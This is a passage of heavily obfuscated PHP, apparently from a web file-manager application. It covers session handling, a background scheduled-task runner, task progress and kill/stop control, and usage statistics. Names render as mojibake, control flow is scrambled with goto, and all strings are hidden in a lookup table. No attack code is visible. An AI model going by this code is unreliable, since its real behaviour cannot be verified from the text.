self::init(); return self::$sessionSign; } public static function set($EÖ·†Ûá‰Ø, $fÍ×‡­µšë = false) { self::init(); if (is_array($EÖ·†Ûá‰Ø)) { foreach ($EÖ·†Ûá‰Ø as $FÕèçÛËõÎ => $DÃİéøó‘) { array_set_value(self::$data, $FÕèçÛËõÎ, $DÃİéøó‘); } } else { array_set_value(self::$data, $EÖ·†Ûá‰Ø, $fÍ×‡­µšë); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($dÕ‰Š•ÖÈ = false) { self::init(); if (!$dÕ‰Š•ÖÈ) { return self::$data; } return array_get_value(self::$data, $dÕ‰Š•ÖÈ); } public static function remove($EÆªäà…) { self::init(); unset(self::$data[$EÆªäà…]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[œÕÊİğö][830])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto BÍ”Ú×í”ƒ; eßéè†•Ô’: while (!0) { self::cacheClear(); if (self::valueGet($A»èÑÈï£Ë[740]) != $A»èÑÈï£Ë[97]) { self::valueSet($A»èÑÈï£Ë[1514], $A»èÑÈï£Ë[201]); self::log($A»èÑÈï£Ë[1518]); die; } self::valueSet($A»èÑÈï£Ë[1514], $A»èÑÈï£Ë[97]); self::valueSet($A»èÑÈï£Ë[1515], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto bÌ´±¶¿Ö; BÍ”Ú×í”ƒ: $A»èÑÈï£Ë =& $_SERVER[œÕÊİğö]; if (self::valueGet($A»èÑÈï£Ë[740]) != $A»èÑÈï£Ë[97]) { return; } if (self::valueGet($A»èÑÈï£Ë[1514]) == $A»èÑÈï£Ë[97]) { $bèÏµäÒğø = self::valueGet($A»èÑÈï£Ë[1515]); if (time() - $bèÏµäÒğø > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto b¼Âƒ¨¥Ï®; b¼Âƒ¨¥Ï®: http_close(); self::valueSet($A»èÑÈï£Ë[1514], $A»èÑÈï£Ë[97]); Hook::bind($A»èÑÈï£Ë[1516], $A»èÑÈï£Ë[1517]); goto eßéè†•Ô’; bÌ´±¶¿Ö: } public static function restart() { $E¿‹Ò¹ù†’ =& $_SERVER[œÕÊİğö]; http_close(); self::valueSet($E¿‹Ò¹ù†’[740], $E¿‹Ò¹ù†’[201]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($E¿‹Ò¹ù†’[1514], $E¿‹Ò¹ù†’[201]); self::valueSet($E¿‹Ò¹ù†’[740], $E¿‹Ò¹ù†’[97]); } public static function shutdownEvent() { $aË¥êËÅÊ— =& $_SERVER[œÕÊİğö]; self::valueSet($aË¥êËÅÊ—[1514], $aË¥êËÅÊ—[201]); self::log($aË¥êËÅÊ—[1519]); } public static function config($EÚ‰Ş„ãÓ, $Bö’Èà¨) { self::valueSet($_SERVER[œÕÊİğö][740], $EÚ‰Ş„ãÓ); } private static function taskRunAll() { goto E¡á…Ÿƒç; AÊò«•ôÆ‘: $F»×Ã¯©õ” = count($b“±Ñàº¥î); for ($DÁì¬ªõªœ = 0; $DÁì¬ªõªœ < $F»×Ã¯©õ”; $DÁì¬ªõªœ++) { $F™Ì‰–ÀŒ“ = $b“±Ñàº¥î[$DÁì¬ªõªœ]; if (!$F™Ì‰–ÀŒ“[$bÛ‰Êõ†Øã[404]] || $F™Ì‰–ÀŒ“[$bÛ‰Êõ†Øã[1521]] != $bÛ‰Êõ†Øã[97]) { continue; } if (!self::taskTimeCheck($F™Ì‰–ÀŒ“)) { continue; } self::taskRun($F™Ì‰–ÀŒ“); } Hook::trigger($bÛ‰Êõ†Øã[1522]); goto döèÆÌ¸á; E¡á…Ÿƒç: $bÛ‰Êõ†Øã =& $_SERVER[œÕÊİğö]; $eòÌ…½ŞŠè = timeFloat(); $b“±Ñàº¥î = Model($bÛ‰Êõ†Øã[1520])->listData(); goto AÊò«•ôÆ‘; döèÆÌ¸á: self::taskQueueRun($eòÌ…½ŞŠè); goto DÑŠ„İÉ¢ö; DÑŠ„İÉ¢ö: } private static function taskQueueRun($eÆ àÒÉÑ‚) { $aƒ©å¯ÖÈ = 10; while (!0) { $a”ÛÀ‡­öè = TaskQueue::run(); if ($a”ÛÀ‡­öè === !1) { break; } if (timeFloat() - $eÆ àÒÉÑ‚ >= $aƒ©å¯ÖÈ) { break; } } } private static function taskTimeCheck($a”ã¿ßîŸ«) { goto fŒ•…ßÕÑ; f¢¦ª–É»Ì: switch ($bÒ¬¼Œ™ËÉ[$C¤õ˜ñÇ‹[39]]) { case $C¤õ˜ñÇ‹[1529]: if (time() - $E¹Ûš¯Ô­ < 3600 * 24 * 30) { return !1; } if ($bÒ¬¼Œ™ËÉ[$C¤õ˜ñÇ‹[1529]] == date($C¤õ˜ñÇ‹[1530]) && $a¦ÃË¶‘‹È) { return !0; } break; case $C¤õ˜ñÇ‹[1531]: if (time() - $E¹Ûš¯Ô­ < 3600 * 24 * 7) { return !1; } $aŠƒ•‹§¦’ = date($C¤õ˜ñÇ‹[1532]) == 0 ? 7 : date($C¤õ˜ñÇ‹[1532]); if ($bÒ¬¼Œ™ËÉ[$C¤õ˜ñÇ‹[1531]] == $aŠƒ•‹§¦’ && $a¦ÃË¶‘‹È) { return !0; } break; case $C¤õ˜ñÇ‹[1524]: if (time() - $E¹Ûš¯Ô­ < 3600 * 24) { return !1; } if ($a¦ÃË¶‘‹È) { return !0; } break; case $C¤õ˜ñÇ‹[1533]: if (time() - $E¹Ûš¯Ô­ >= floatval($bÒ¬¼Œ™ËÉ[$C¤õ˜ñÇ‹[1533]]) * 60) { return !0; } break; default: break; } return !1; goto FÛ‘ßÕˆßß; fŒ•…ßÕÑ: $C¤õ˜ñÇ‹ =& $_SERVER[œÕÊİğö]; $bÒ¬¼Œ™ËÉ = json_decode($a”ã¿ßîŸ«[$C¤õ˜ñÇ‹[207]], !0); $E¹Ûš¯Ô­ = intval($a”ã¿ßîŸ«[$C¤õ˜ñÇ‹[1515]]); goto cÖÏ«·„ä¦; cÖÏ«·„ä¦: $D¬¾¿µÊ™Í = strtotime($C¤õ˜ñÇ‹[1523] . $bÒ¬¼Œ™ËÉ[$C¤õ˜ñÇ‹[1524]] . $C¤õ˜ñÇ‹[1525]) - strtotime($C¤õ˜ñÇ‹[1526]); $b‡‚Åˆòî = time() - strtotime(date($C¤õ˜ñÇ‹[1527]) . $C¤õ˜ñÇ‹[1528]); $a¦ÃË¶‘‹È = $b‡‚Åˆòî >= $D¬¾¿µÊ™Í && $b‡‚Åˆòî <= $D¬¾¿µÊ™Í + 3600; goto f¢¦ª–É»Ì; FÛ‘ßÕˆßß: } private static function closeDatabase() { goto aù²Ò±ğˆÕ; aù²Ò±ğˆÕ: $c¥ÈšİÏß =& $_SERVER[œÕÊİğö]; static $b¯Ìˆó Ò… = 0; $d£†ÉËòÄ¢ = 300; goto C×Ş°„ä·£; C×Ş°„ä·£: if (!$b¯Ìˆó Ò…) { $b¯Ìˆó Ò… = time(); } if (time() - $b¯Ìˆó Ò… < $d£†ÉËòÄ¢) { return; } $b¯Ìˆó Ò… = time(); goto FÆ½Ùâ®Ç; FÆ½Ùâ®Ç: $AÛ‹¶»„Óù = Model($c¥ÈšİÏß[516])->db($c¥ÈšİÏß[43]); if ($AÛ‹¶»„Óù) { $AÛ‹¶»„Óù->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($c¥ÈšİÏß[1534], $c¥ÈšİÏß[1535]); die; } goto CÔ·‹ÒÌ—; CÔ·‹ÒÌ—: } public static function taskRun($dä¥Ú³©‘) { goto c»²ºˆ–¬ß; F—¹àÈ´Ùõ: return !0; goto E¬™ÆÆ‡; c»²ºˆ–¬ß: $cÆ¤Û ùÊ =& $_SERVER[œÕÊİğö]; self::log($cÆ¤Û ùÊ[1536] . $dä¥Ú³©‘[$cÆ¤Û ùÊ[404]] . $cÆ¤Û ùÊ[1537] . $dä¥Ú³©‘[$cÆ¤Û ùÊ[38]] . $cÆ¤Û ùÊ[1538] . $dä¥Ú³©‘[$cÆ¤Û ùÊ[1539]]); Model($cÆ¤Û ùÊ[1520])->run($dä¥Ú³©‘[$cÆ¤Û ùÊ[404]]); goto A·Ğ®„Õø‚; fêñî™è˜: Model($cÆ¤Û ùÊ[1540])->add(array($cÆ¤Û ùÊ[1541] => $cÆ¤Û ùÊ[43], $cÆ¤Û ùÊ[1542] => $cÆ¤Û ùÊ[201], $cÆ¤Û ùÊ[39] => $cÆ¤Û ùÊ[1543] . $dä¥Ú³©‘[$cÆ¤Û ùÊ[404]], $cÆ¤Û ùÊ[1544] => json_encode(array($cÆ¤Û ùÊ[38] => $dä¥Ú³©‘[$cÆ¤Û ùÊ[38]], $cÆ¤Û ùÊ[1545] => timeFloat() - $a…†ĞÄ³, $cÆ¤Û ùÊ[301] => $A÷½“¦ôŒ)))); $C“Ó¡¤·Ì¡ = $A÷½“¦ôŒ ? $cÆ¤Û ùÊ[1546] . $A÷½“¦ôŒ : $cÆ¤Û ùÊ[43]; self::log($cÆ¤Û ùÊ[1547] . $dä¥Ú³©‘[$cÆ¤Û ùÊ[404]] . $cÆ¤Û ùÊ[539] . $C“Ó¡¤·Ì¡); goto F—¹àÈ´Ùõ; A·Ğ®„Õø‚: $a…†ĞÄ³ = timeFloat(); $A÷½“¦ôŒ = $cÆ¤Û ùÊ[43]; switch ($dä¥Ú³©‘[$cÆ¤Û ùÊ[39]]) { case $cÆ¤Û ùÊ[315]: $D÷Í³Œ™½‚ = url_request($dä¥Ú³©‘[$cÆ¤Û ùÊ[1539]], $cÆ¤Û ùÊ[238], !1, !1, !1, !1, 10); if ($D÷Í³Œ™½‚[$cÆ¤Û ùÊ[740]]) { $A÷½“¦ôŒ = strlen($D÷Í³Œ™½‚[$cÆ¤Û ùÊ[1110]]); } break; case $cÆ¤Û ùÊ[237]: $A÷½“¦ôŒ = Hook::apply($dä¥Ú³©‘[$cÆ¤Û ùÊ[1539]]); default: break; } goto fêñî™è˜; E¬™ÆÆ‡: } private static function valueGet($dÙõğ®‘›Ä) { $B¨³‚†—Š› =& $_SERVER[œÕÊİğö]; $f¾Æ½Ö¿¤Ş = $B¨³‚†—Š›[1548]; $c§ŠÔàÌ š = Model($B¨³‚†—Š›[436])->get($dÙõğ®‘›Ä, $f¾Æ½Ö¿¤Ş); if (is_null($c§ŠÔàÌ š)) { Model($B¨³‚†—Š›[436])->set($B¨³‚†—Š›[740], $B¨³‚†—Š›[97], $f¾Æ½Ö¿¤Ş); Model($B¨³‚†—Š›[436])->set($B¨³‚†—Š›[1514], $B¨³‚†—Š›[201], $f¾Æ½Ö¿¤Ş); $c§ŠÔàÌ š = Model($B¨³‚†—Š›[436])->get($dÙõğ®‘›Ä, $f¾Æ½Ö¿¤Ş); } return $c§ŠÔàÌ š; } private static function valueSet($B‚ˆæÊÇœ, $Bì„éÊÙæ) { $D™·õ²àù› =& $_SERVER[œÕÊİğö]; $b­›±ƒùŸÀ = $D™·õ²àù›[1549]; CacheLock::lock($b­›±ƒùŸÀ); $C×†ÎÅÜë¶ = Model($D™·õ²àù›[436])->set($B‚ˆæÊÇœ, $Bì„éÊÙæ, $D™·õ²àù›[1548]); CacheLock::unlock($b­›±ƒùŸÀ); return $C×†ÎÅÜë¶; } protected static function log($E‹Õ‰ÇÄ¦È) { write_log($E‹Õ‰ÇÄ¦È, $_SERVER[œÕÊİğö][1535]); } private static function cacheClear() { $FÛ–ËÌí =& $_SERVER[œÕÊİğö]; Cache::clearMemory(Model($FÛ–ËÌí[436])->cacheKey($FÛ–ËÌí[1548])); Cache::clearMemory(Model($FÛ–ËÌí[436])->cacheKey($FÛ–ËÌí[1550])); Model($FÛ–ËÌí[1520])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($Cò‡‰ÑÓÄò, $fó–í×Ò“ = '', $C±¼¾ŒïĞ = 0, $AöêâÅàÃÎ = '') { goto BÂ³ËâÔ„; BÂ³ËâÔ„: $BË´£ø¿ë =& $_SERVER[œÕÊİğö]; if (self::get($Cò‡‰ÑÓÄò)) { return; } $this->task = array($BË´£ø¿ë[404] => $Cò‡‰ÑÓÄò, $BË´£ø¿ë[1551] => USER_ID, $BË´£ø¿ë[1452] => $AöêâÅàÃÎ, $BË´£ø¿ë[39] => $fó–í×Ò“, $BË´£ø¿ë[1046] => $BË´£ø¿ë[43], $BË´£ø¿ë[1044] => $C±¼¾ŒïĞ, $BË´£ø¿ë[1058] => 0, $BË´£ø¿ë[1552] => 0, $BË´£ø¿ë[1553] => 0, $BË´£ø¿ë[779] => timeFloat(), $BË´£ø¿ë[778] => 0, $BË´£ø¿ë[1554] => 0, $BË´£ø¿ë[1555] => 0, $BË´£ø¿ë[1556] => 0, $BË´£ø¿ë[740] => $BË´£ø¿ë[1514]); goto a¶˜¤ÔŒ¤; a¶˜¤ÔŒ¤: $GLOBALS[$BË´£ø¿ë[1557]] = 1; Hook::bind($BË´£ø¿ë[1516], array($this, $BË´£ø¿ë[1558])); Hook::bind($BË´£ø¿ë[1559], array($this, $BË´£ø¿ë[1560])); goto d °™ìïöÉ; d °™ìïöÉ: $this->startAfter(); Hook::trigger($BË´£ø¿ë[1561], $this->task); $this->task[$BË´£ø¿ë[1554]] = timeFloat(); goto Fâ¦ùÄŸœ; Fâ¦ùÄŸœ: } public function end() { goto C†¹±œ×ÁÜ; C†¹±œ×ÁÜ: $dóÆ…šãÎ‘ =& $_SERVER[œÕÊİğö]; if (!$this->task) { return; } if ($this->task[$dóÆ…šãÎ‘[1554]]) { self::valueSet($this->task[$dóÆ…šãÎ‘[404]], !1); } goto B®‡Û¡ä±; B®‡Û¡ä±: $F“­µò½”¦ = timeFloat() - $this->task[$dóÆ…šãÎ‘[779]]; self::log($dóÆ…šãÎ‘[1562] . $this->task[$dóÆ…šãÎ‘[404]] . $dóÆ…šãÎ‘[1563] . $F“­µò½”¦ . $dóÆ…šãÎ‘[1564]); Hook::unbind($dóÆ…šãÎ‘[1516], array($this, $dóÆ…šãÎ‘[1558])); goto d…„µÊ¤‡‚; d…„µÊ¤‡‚: Hook::unbind($dóÆ…šãÎ‘[1559], array($this, $dóÆ…šãÎ‘[1560])); $this->endAfter(); $this->task = !1; goto FµæÎ½ Ó; FµæÎ½ Ó: } public function update($eˆ¸¨æ¬éÜ = 0, $D—ØØ‚àœˆ = false) { goto c¯÷Ÿ¸Ï¤; c¯÷Ÿ¸Ï¤: $cò¸ø¦Àè÷ =& $_SERVER[œÕÊİğö]; $aŞ‰ĞğòàÔ =& $this->task; if (!$aŞ‰ĞğòàÔ) { return; } goto D·¦¼´ïô; cŞ«ºì´…: $this->updateAfter(); $e†Ş®·×©¥ = 0.2; if (timeFloat() - $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1554]] < $e†Ş®·×©¥ && !$D—ØØ‚àœˆ) { return; } goto C‹Ò–Åï×; C‹Ò–Åï×: $Bˆˆä‹å = self::get($aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[404]]); $FÁÁÂ¹×Í‰ = $Bˆˆä‹å[$cò¸ø¦Àè÷[740]]; if ($FÁÁÂ¹×Í‰ == self::STATYS_KILL) { $EÖ®êÏ³… = array($cò¸ø¦Àè÷[1565] => LNG($cò¸ø¦Àè÷[1566]), $cò¸ø¦Àè÷[1108] => !1); Cache::set($cò¸ø¦Àè÷[1567] . $this->task[$cò¸ø¦Àè÷[404]], $EÖ®êÏ³…, 30); $this->onKill(); $this->end(); die; } else { if ($FÁÁÂ¹×Í‰ == self::STATYS_STOP) { $C¨“Ä‘â‚× = 2; $Bˆˆä‹å[$cò¸ø¦Àè÷[1555]] += $C¨“Ä‘â‚×; self::valueSet($aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[404]], $Bˆˆä‹å); sleep($C¨“Ä‘â‚×); $this->update(); return; } } goto aë‹”¿·ãá; D·¦¼´ïô: $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1058]] += $eˆ¸¨æ¬éÜ; $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[778]] = timeFloat(); if ($aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1044]]) { if ($aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1044]] < $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1058]]) { $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1044]] = $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1058]]; } $FÀÍçê÷ËÈ = timeFloat() - $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[779]] - $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1555]]; $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1552]] = $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1058]] / $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1044]]; $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1553]] = $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1058]] / $FÀÍçê÷ËÈ; if ($aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1552]] > 0) { $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1556]] = $FÀÍçê÷ËÈ * (1 - $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1552]]) / $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1552]]; } $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1556]] = $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1556]] <= 0 ? 0 : $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1556]]; } goto cŞ«ºì´…; aë‹”¿·ãá: $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[740]] = $FÁÁÂ¹×Í‰ ? $FÁÁÂ¹×Í‰ : $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[740]]; $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1555]] = $Bˆˆä‹å[$cò¸ø¦Àè÷[1555]] ? $Bˆˆä‹å[$cò¸ø¦Àè÷[1555]] : 0; $aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[1554]] = timeFloat(); goto dÌ®—˜Í¦; dÌ®—˜Í¦: Hook::trigger($cò¸ø¦Àè÷[1568], $aŞ‰ĞğòàÔ); self::valueSet($aŞ‰ĞğòàÔ[$cò¸ø¦Àè÷[404]], $aŞ‰ĞğòàÔ); goto CÃ„°ôéâ; CÃ„°ôéâ: } public function onKillSet($e™ŒâöÅ¤÷, $cÔƒÈíÀ½· = array()) { $this->onKillCall = array($e™ŒâöÅ¤÷, $cÔƒÈíÀ½·); } public function onKill() { $Dƒâ“ÀÆ…ñ =& $_SERVER[œÕÊİğö]; self::log($Dƒâ“ÀÆ…ñ[1562] . $this->task[$Dƒâ“ÀÆ…ñ[404]] . $Dƒâ“ÀÆ…ñ[1569]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($bª®®äÄ¤¿) { $e¹Õ‰†Ÿ˜ =& $_SERVER[œÕÊİğö]; Cache::set($e¹Õ‰†Ÿ˜[1567] . $this->task[$e¹Õ‰†Ÿ˜[404]], $bª®®äÄ¤¿, 60); return $bª®®äÄ¤¿; } public static function get($Få…º¥—ëò) { $eÙŠ†­ÂÎÀ =& $_SERVER[œÕÊİğö]; $Aí‰±²›‹ = self::valueGet($Få…º¥—ëò); if (is_array($Aí‰±²›‹) && $Aí‰±²›‹[$eÙŠ†­ÂÎÀ[1570]]) { $aìÆªæÓ£Š = ActionApply($Aí‰±²›‹[$eÙŠ†­ÂÎÀ[1570]], array($Aí‰±²›‹)); $Aí‰±²›‹ = is_array($aìÆªæÓ£Š) ? $aìÆªæÓ£Š : $Aí‰±²›‹; } return $Aí‰±²›‹; } public static function listData() { $BÇ …Ä©ó÷ = self::valueGet(); return array_sort_by($BÇ …Ä©ó÷, $_SERVER[œÕÊİğö][779], !0); } public static function kill($AÉİ¹‡ÈÆ) { return self::changeStatus($AÉİ¹‡ÈÆ, self::STATYS_KILL); } public static function stop($e¢òà›«èè) { return self::changeStatus($e¢òà›«èè, self::STATYS_STOP); } public static function restart($cùŞµ“Ø»ä) { return self::changeStatus($cùŞµ“Ø»ä, self::STATYS_RUNNING); } public static function killAll() { $bÜ¿ÛäĞİš =& $_SERVER[œÕÊİğö]; $a©Ÿ«Ô®šÀ = self::listData(); foreach ($a©Ÿ«Ô®šÀ as $aõ´í¹”÷¤) { self::kill($aõ´í¹”÷¤[$bÜ¿ÛäĞİš[404]]); } sleep(2); foreach ($a©Ÿ«Ô®šÀ as $aõ´í¹”÷¤) { self::valueSet($aõ´í¹”÷¤[$bÜ¿ÛäĞİš[404]], !1); } } private static function changeStatus($b†î°Íµ¥Š, $F®ñ‘¹ß´) { goto B¾…êƒäñ¥; B¾…êƒäñ¥: $Eœº„ƒĞâ =& $_SERVER[œÕÊİğö]; $cõµİÇ¥Ç÷ = self::valueGet($b†î°Íµ¥Š); if (!$cõµİÇ¥Ç÷) { return !1; } goto bÏ“Ñ›à¸; BáŞ¹®İà…: return !0; goto DÍ‹ÙëğÉè; bÏ“Ñ›à¸: $cõµİÇ¥Ç÷[$Eœº„ƒĞâ[740]] = $F®ñ‘¹ß´; self::valueSet($b†î°Íµ¥Š, $cõµİÇ¥Ç÷); self::log($Eœº„ƒĞâ[1571] . $cõµİÇ¥Ç÷[$Eœº„ƒĞâ[404]] . $Eœº„ƒĞâ[1572] . $F®ñ‘¹ß´); goto BáŞ¹®İà…; DÍ‹ÙëğÉè: } public static function valueGet($A „ñÊ‹Æ´ = false) { $EÊ¦ŒÇƒ†ë =& $_SERVER[œÕÊİğö]; if ($A „ñÊ‹Æ´) { $c©ºÄÄšÎ‹ = Model($EÊ¦ŒÇƒ†ë[448])->where(array($EÊ¦ŒÇƒ†ë[103] => $A „ñÊ‹Æ´, $EÊ¦ŒÇƒ†ë[39] => $EÊ¦ŒÇƒ†ë[1573]))->find(); return $c©ºÄÄšÎ‹ ? json_decode($c©ºÄÄšÎ‹[$EÊ¦ŒÇƒ†ë[382]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($e¢âãòÁ†Ñ = false) { goto fÄÇ®±µ‘³; Bö×ŸÎŸİ´: $FğåÉë‹ó = Model($Bøˆ’ÓËÈ[448])->where($F™Õ¡ëÂ…)->select(); $FğåÉë‹ó = $FğåÉë‹ó ? $FğåÉë‹ó : array(); foreach ($FğåÉë‹ó as $fì¹ñ’Ãç => $CâÕÉé ×‡) { $FğåÉë‹ó[$fì¹ñ’Ãç] = json_decode($CâÕÉé ×‡[$Bøˆ’ÓËÈ[382]], !0); } goto D¤¹åñÅ¨™; D¤¹åñÅ¨™: return $FğåÉë‹ó; goto aô›Ğ×“Òñ; fÄÇ®±µ‘³: $Bøˆ’ÓËÈ =& $_SERVER[œÕÊİğö]; $F™Õ¡ëÂ… = array($Bøˆ’ÓËÈ[39] => $Bøˆ’ÓËÈ[1573]); if ($e¢âãòÁ†Ñ) { $F™Õ¡ëÂ…[$Bøˆ’ÓËÈ[1551]] = $e¢âãòÁ†Ñ; } goto Bö×ŸÎŸİ´; aô›Ğ×“Òñ: } public static function valueSet($Aº…²Ø‚İÌ, $C¥İ‘‚‡Œ½) { goto F°“‘¸Ó‡‹; d§Ä¿Ò”é: CacheLock::unlock($Eù„Ù‡ˆä•); goto aÔÚŠ´ÎÂ½; cêó‰ÀŒ‡: if (!$c®ØÑôÎİÉ) { ob_start(); var_dump($C¥İ‘‚‡Œ½); $AŠ”ÆËÙÉ = ob_get_clean(); self::log($d»ÓÅ§Åˆ[1574] . json_encode_force($AŠ”ÆËÙÉ)); } if (!$Aº…²Ø‚İÌ || !$C¥İ‘‚‡Œ½[$d»ÓÅ§Åˆ[404]]) { return !1; } $C¤À¢¼É± = array($d»ÓÅ§Åˆ[39] => $d»ÓÅ§Åˆ[1573], $d»ÓÅ§Åˆ[1551] => USER_ID, $d»ÓÅ§Åˆ[103] => $Aº…²Ø‚İÌ, $d»ÓÅ§Åˆ[382] => $c®ØÑôÎİÉ); goto AÌµ¯•ÀºØ; AÌµ¯•ÀºØ: $Eù„Ù‡ˆä• = $d»ÓÅ§Åˆ[1575]; CacheLock::lock($Eù„Ù‡ˆä•); Model($d»ÓÅ§Åˆ[448])->add($C¤À¢¼É±, array(), !0); goto d§Ä¿Ò”é; F°“‘¸Ó‡‹: $d»ÓÅ§Åˆ =& $_SERVER[œÕÊİğö]; if (!$C¥İ‘‚‡Œ½) { return Model($d»ÓÅ§Åˆ[448])->where(array($d»ÓÅ§Åˆ[103] => $Aº…²Ø‚İÌ, $d»ÓÅ§Åˆ[39] => $d»ÓÅ§Åˆ[1573]))->delete(); } $c®ØÑôÎİÉ = json_encode($C¥İ‘‚‡Œ½); goto cêó‰ÀŒ‡; aÔÚŠ´ÎÂ½: } public static function log($F§¬‘›£¢) { if (!GLOBAL_DEBUG) { return; } write_log($F§¬‘›£¢, $_SERVER[œÕÊİğö][1576]); } } goto d¦ùß¾šĞè; E–¾¿¹¯ÎÃ: class AnalysisModel extends ModelBaseLight { public function init($A¥†äš¬—Æ) { $DÓ¹°§óğ» =& $_SERVER[œÕÊİğö]; $C©™öÙŸº = array($DÓ¹°§óğ»[597] => array($DÓ¹°§óğ»[39] => $DÓ¹°§óğ»[1646], $DÓ¹°§óğ»[281] => array($DÓ¹°§óğ»[232], $DÓ¹°§óğ»[755], $DÓ¹°§óğ»[1647], $DÓ¹°§óğ»[1648])), $DÓ¹°§óğ»[1649] => array($DÓ¹°§óğ»[39] => $DÓ¹°§óğ»[1650], $DÓ¹°§óğ»[281] => array($DÓ¹°§óğ»[232], $DÓ¹°§óğ»[753], $DÓ¹°§óğ»[1651], $DÓ¹°§óğ»[1652], $DÓ¹°§óğ»[1653]))); if (!isset($C©™öÙŸº[$A¥†äš¬—Æ])) { return !1; } $this->optionType = $C©™öÙŸº[$A¥†äš¬—Æ][$DÓ¹°§óğ»[39]]; $this->field = $C©™öÙŸº[$A¥†äš¬—Æ][$DÓ¹°§óğ»[281]]; return !0; } public function listData($aö£¨ĞÈ³ = false, $cöïĞÙåÕ = "\155\157\x64\x69\146\x79\124\x69\155\145", $Fè¶©‚•Êß = false) { return parent::listData($aö£¨ĞÈ³, $cöïĞÙåÕ, $Fè¶©‚•Êß); } public function trendList($F–òíî¨Üõ) { goto dö«†œ¯; cíˆÕ÷Ä§İ: if (!isset($fíÄóéÑ‡ø)) { $bƒÌÒ¢ÄùŒ = $F–òíî¨Üõ == $BŒï‰çíÂ[597] ? $BŒï‰çíÂ[541] : $BŒï‰çíÂ[822]; $fíÄóéÑ‡ø = Model($bƒÌÒ¢ÄùŒ)->min($BŒï‰çíÂ[204]); } $Cš‹ï™òåö = $BŒï‰çíÂ[1656] . ucfirst($F–òíî¨Üõ); $AÑáƒ™Ï–• = $this->dateList($fíÄóéÑ‡ø); goto DîÒÙ‹…ÀÎ; dö«†œ¯: $BŒï‰çíÂ =& $_SERVER[œÕÊİğö]; $EÉéºçƒ¨ = $this->listData(); if ($EÉéºçƒ¨) { $E²²„èÂÜ = end($EÉéºçƒ¨); $dòí§³„â­ = date($BŒï‰çíÂ[1654], strtotime($BŒï‰çíÂ[1655])); if ($E²²„èÂÜ[$BŒï‰çíÂ[232]] == $dòí§³„â­) { return $EÉéºçƒ¨; } $fíÄóéÑ‡ø = strtotime($E²²„èÂÜ[$BŒï‰çíÂ[232]]); } goto cíˆÕ÷Ä§İ; DîÒÙ‹…ÀÎ: foreach ($AÑáƒ™Ï–• as $dòí§³„â­) { $this->{$Cš‹ï™òåö}($dòí§³„â­); } return $this->listData(); goto a©¸À§ôØ¤; a©¸À§ôØ¤: } private function dateList($dÆ¹×¿Èİ) { $fÀ·Ğ„Õ§Ì =& $_SERVER[œÕÊİğö]; $F‹¾‘å‘„Ú = $dÆ¹×¿Èİ; $C¼Ê¤ôâ = strtotime($fÀ·Ğ„Õ§Ì[1655]); $cª§’ãà–¿ = array(); while ($F‹¾‘å‘„Ú <= $C¼Ê¤ôâ) { $cª§’ãà–¿[] = date($fÀ·Ğ„Õ§Ì[1654], $F‹¾‘å‘„Ú); $F‹¾‘å‘„Ú = strtotime($fÀ·Ğ„Õ§Ì[1657], $F‹¾‘å‘„Ú); } return $cª§’ãà–¿; } public function _recordUser($Aéøëñ×ÃÃ = '') { goto aÌë Ù´®—; fëáŸÜ†é¿: $aÅğ¶”ƒ’ = array($AóÀ†ÒˆßÉ[232] => $Aéøëñ×ÃÃ, $AóÀ†ÒˆßÉ[755] => (int) $cšœ¸Ú’×é, $AóÀ†ÒˆßÉ[1647] => (int) $c÷²ÍÕ Ä, $AóÀ†ÒˆßÉ[1648] => (int) $dÄ¹è¾Ö¨Ä); return $this->insert($aÅğ¶”ƒ’); goto B½ç›á¼³; E¼œ‰¬†ñÉ: $c÷²ÍÕ Ä = 